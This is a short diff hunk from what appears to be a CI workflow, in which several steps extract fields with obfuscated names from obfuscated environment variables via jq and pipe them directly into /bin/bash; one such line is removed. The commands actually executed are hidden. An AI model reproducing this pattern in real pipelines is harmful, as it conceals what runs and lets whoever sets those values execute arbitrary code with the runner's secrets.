@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$zynq3433" | jq -r .yyhkf2 | /bin/bash
           echo $x5271 | jq -r .vfn9516 | /bin/bash
           printf '%s' "$cb87" | jq -r .l8849 | /bin/bash
-          printf '%s' "$lfjkf7" | jq -r .ckn34805 | /bin/bash
           printf '%s' "$s557" | jq -r .vm64679 | /bin/bash
 
       - name: Archive results
